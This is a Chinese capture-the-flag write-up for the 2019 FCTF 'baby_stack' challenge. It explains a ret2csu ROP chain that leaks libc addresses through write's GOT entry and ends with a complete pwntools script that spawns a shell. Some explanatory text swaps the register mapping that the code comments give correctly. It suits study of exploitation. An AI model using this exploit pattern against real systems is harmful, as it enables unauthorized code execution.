# 2019-FCTF-PWN-baby_stack

**源代码**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-20h]
  init(*(_QWORD *)&argc, argv, envp);
  banner();
  fctf_read(&v4);
  return 0;
}
```

**1. checksec**

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以看出程序是 64位程序，其仅仅开启了栈不可执行保护。

**2. 查看一些系统函数**

```shell
重定位节 '.rela.dyn' at offset 0x4b0 contains 4 entries:
  偏移量          信息           类型           符号值        符号名称 + 加数
000000600ff8  000800000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
000000601080  000a00000005 R_X86_64_COPY     0000000000601080 stdout@GLIBC_2.2.5 + 0
000000601090  000b00000005 R_X86_64_COPY     0000000000601090 stdin@GLIBC_2.2.5 + 0
0000006010a0  000c00000005 R_X86_64_COPY     00000000006010a0 stderr@GLIBC_2.2.5 + 0

重定位节 '.rela.plt' at offset 0x510 contains 8 entries:
  偏移量          信息           类型           符号值        符号名称 + 加数
000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 write@GLIBC_2.2.5 + 0
000000601028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 setbuf@GLIBC_2.2.5 + 0
000000601030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 alarm@GLIBC_2.2.5 + 0
000000601038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
000000601040  000600000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main@GLIBC_2.2.5 + 0
000000601048  000700000007 R_X86_64_JUMP_SLO 0000000000000000 signal@GLIBC_2.2.5 + 0
000000601050  000900000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0

```

**3. 结论**

程序明显存在栈溢出, 但是有没有其他的可以利用的函数。找不到 system("/bin/sh")。将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 /bin/sh 字符串的地址。

**4.基本利用思路如下**

因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。可以看到这个程序仅仅只有一个buffer overflow，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到system()的值，然后再传递“/bin/sh”到.bss段,最后调用system(“/bin/sh”)。因为原程序使用了write()和read()函数，我们可以通过write()去输出write.got的地址，从而计算出libc.so在内存中的地址。但问题在于write()的参数应该如何传递，因为x64下前6个参数不是保存在栈中，而是通过寄存器传值。我们使用ROPgadget并没有找到类似于`pop rdi, ret`,`pop rsi, ret`这样的gadgets。那应该怎么办呢？其实在x64下有一些万能的gadgets可以利用。比如说我们用`objdump -d ./baby_stack观察一下`__libc_csu_init()`这个函数。一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。

- 利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数
- 根据 libcsearcher 获取对应 libc 版本以及 system 函数地址
- 再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 system 地址以及 '/bin/sh’ 地址，并使得程序重新执行 main 函数。
- 再次利用栈溢出执行 libc_csu_gadgets 执行 system('/bin/sh') 获取 shell。

```shell
.text:00000000004008A0 ; void _libc_csu_init(void)
.text:00000000004008A0                 public __libc_csu_init
.text:00000000004008A0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
.text:00000000004008A0 ; __unwind {
.text:00000000004008A0                 push    r15
.text:00000000004008A2                 push    r14
.text:00000000004008A4                 mov     r15d, edi
.text:00000000004008A7                 push    r13
.text:00000000004008A9                 push    r12
.text:00000000004008AB                 lea     r12, __frame_dummy_init_array_entry
.text:00000000004008B2                 push    rbp
.text:00000000004008B3                 lea     rbp, __do_global_dtors_aux_fini_array_entry
.text:00000000004008BA                 push    rbx
.text:00000000004008BB                 mov     r14, rsi
.text:00000000004008BE                 mov     r13, rdx
.text:00000000004008C1                 sub     rbp, r12
.text:00000000004008C4                 sub     rsp, 8
.text:00000000004008C8                 sar     rbp, 3
.text:00000000004008CC                 call    _init_proc
.text:00000000004008D1                 test    rbp, rbp
.text:00000000004008D4                 jz      short loc_4008F6
.text:00000000004008D6                 xor     ebx, ebx
.text:00000000004008D8                 nop     dword ptr [rax+rax+00000000h]
.text:00000000004008E0
.text:00000000004008E0 loc_4008E0:                             ; CODE XREF: __libc_csu_init+54↓j
.text:00000000004008E0                 mov     rdx, r13
.text:00000000004008E3                 mov     rsi, r14
.text:00000000004008E6                 mov     edi, r15d
.text:00000000004008E9                 call    qword ptr [r12+rbx*8]
.text:00000000004008ED                 add     rbx, 1
.text:00000000004008F1                 cmp     rbx, rbp
.text:00000000004008F4                 jnz     short loc_4008E0
.text:00000000004008F6
.text:00000000004008F6 loc_4008F6:                             ; CODE XREF: __libc_csu_init+34↑j
.text:00000000004008F6                 add     rsp, 8
.text:00000000004008FA                 pop     rbx
.text:00000000004008FB                 pop     rbp
.text:00000000004008FC                 pop     r12
.text:00000000004008FE                 pop     r13
.text:0000000000400900                 pop     r14
.text:0000000000400902                 pop     r15
.text:0000000000400904                 retn
.text:0000000000400904 ; } // starts at 4008A0
.text:0000000000400904 __libc_csu_init endp
```

```
.text:00000000004008E0                 mov     rdx, r13
.text:00000000004008E3                 mov     rsi, r14
.text:00000000004008E6                 mov     edi, r15d
.text:00000000004008E9                 call    qword ptr [r12+rbx*8]
```

我们可以看到利用0x4008E0处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4008E6处的代码我们将r15的值赋值给rdx,  r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr  [r12+rbx*8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完`call qword ptr [r12+rbx*8]`之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。

64位栈中的数据分布

![栈中布局分布图](https://sp4n9x.github.io/resources/2018/2018-05-11-00.png)

简单的检查一下溢出点

```shell
syc@ubuntu:~/tmp$ cat payload 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
syc@ubuntu:~/tmp$ python pattern.py offset 0x3562413462413362
hex pattern decoded as: b3Ab4Ab5
40
```

溢出点为40.

我们先构造payload1，利用write()输出write在内存中的地址。注意我们的gadget是`call qword ptr [r12+rbx*8]`，所以我们应该使用write.got的地址而不是write.plt的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。

```python
#rdi=edi=r15, rsi=r14, rdx=r13
#write(rdi=1,rsi=write_got,rdx=8)
payload1 = "\x00"*40
                #pop        junk      rbx      rbp         r12           r13         r14           r15          ret
payload1 += p64(0x4008FA) + p64(0) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(0x4008E0)
payload1 += "\x00"*56  #0x38，因为申请了8个字的内存空间
payload1 += p64(main_addr)#再次返回主函数重复利用
```

当我们exp在收到`write()`在内存中的地址后，就可以计算出`system()`在`内存中的地址`了。接着我们构造`payload2`，利用`read()`将`system()的地址`以及`“/bin/sh”`读入到`.bss段`内存中。

```python
#rdi=edi=r15, rsi=r14, rdx=r13
#read(rdi=0,rsi=bss_addr,rdx=16)
payload2 = "\x00"*40
                #pop        junk      rbx      rbp         r12           r13         r14           r15          ret
payload2 += p64(0x4008FA) + p64(0) + p64(0) + p64(1) + p64(read_got) + p64(16) + p64(bss_addr) + p64(0) + p64(0x4008E0)
payload2 += "\x00"*56
payload2 += p64(main_addr)
```

最后我们构造`payload3`,调用system()函数执行“/bin/sh”。注意，`system()的地址`保存在了`.bss段首地址`+0x100上，`“/bin/sh”的地址`保存在了`.bss段首地址+0x100+8`字节上。因为如果直接为bss段首地址会覆盖掉stdout，程序输出会出错。

```
0x601080 <stdout@@GLIBC_2.2.5>:	0x00007fd7fe07a390	0x0068732f6e69622f
0x601090 <stdin@@GLIBC_2.2.5>:	0x00007fd7fe3f98e0	0x0000000000000000
0x6010a0 <stderr@@GLIBC_2.2.5>:	0x00007fd7fe3fa540	0x0000000000000000
```

payload3：

```python
#rdi=edi=r15, rsi=r14, rdx=r13
#system(rdi=bss_addr+8="/bin/sh\0")
payload3 = "\x00"*40
                #pop        junk      rbx      rbp         r12           r13         r14           r15          ret
payload3 += p64(0x4008FA) + p64(0) + p64(0) + p64(1) +p64(bss_addr+0x100) + p64(0) + p64(0) + p64(bss_addr+0x100+8) + p64(0x4008E0)
payload3 += "\x00"*56
payload3 += p64(main_addr)
```

最终exp如下：

```python
from pwn import *
#context.log_level = 'debug'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
baby_stack = ELF('./baby_stack')
sh = process('./baby_stack')
print "\n#####################info#########################\n"
write_got = baby_stack.got['write']
print "write_got: " + hex(write_got)
read_got = baby_stack.got['read']
print "read_got: " + hex(read_got)
write_symbols = baby_stack.symbols['fctf_write']
print "write_symbols: " + hex(write_got)
read_symbols = baby_stack.symbols['fctf_read']
print "read_symbols: " + hex(read_got)
main_addr = baby_stack.symbols['main']
print "main_addr " + hex(main_addr)
bss_base = baby_stack.bss()+0x100
print "bss_base " + hex(bss_base)
print "\n#################################################\n"
csu_front_addr = 0x00000000004008E0
csu_end_addr = 0x00000000004008FA
fakeebp = 'b' * 8 # 8byte ebp
def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = '\x00' * 40
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += '\x00' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)
sh.recvuntil('SMASH IT!\n')
print "\n#############sending payload1#############\n"
csu(0, 1, write_got, 8, write_got, 1, main_addr)
write_addr = u64(sh.recv(8))
print "write_addr: " + hex(write_addr)
libc_base = write_addr - libc.symbols['write']
system_addr = libc_base + libc.symbols['system']
log.success('system_addr: ' + hex(system_addr))
sh.recvuntil('SMASH IT!\n')
print "\n#############sending payload2#############\n"
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(system_addr) + "/bin/sh\0")
sh.recvuntil('SMASH IT!\n')
print "\n#############sending payload3#############\n"
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
```

